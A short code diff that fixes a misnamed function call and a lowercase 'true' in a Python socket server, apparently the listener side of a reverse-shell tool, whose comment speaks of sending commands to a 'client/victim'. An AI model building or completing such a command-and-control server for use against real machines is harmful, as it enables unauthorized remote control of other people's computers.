@@ -37,12 +37,12 @@ def bind_socket():
 def socket_accept():
     conn, address = s.accept()
     print("Connection has been established!  |" + " IP " + address[0] + " | port " + str(address[1]))
-    send_commands(conn)
+    send_command(conn)
     conn.close()
 
 # send commands to client/victim 
 def send_command(conn):
-    while true:
+    while True:
         cmd = input()
         if cmd == 'quit':
             conn.close()
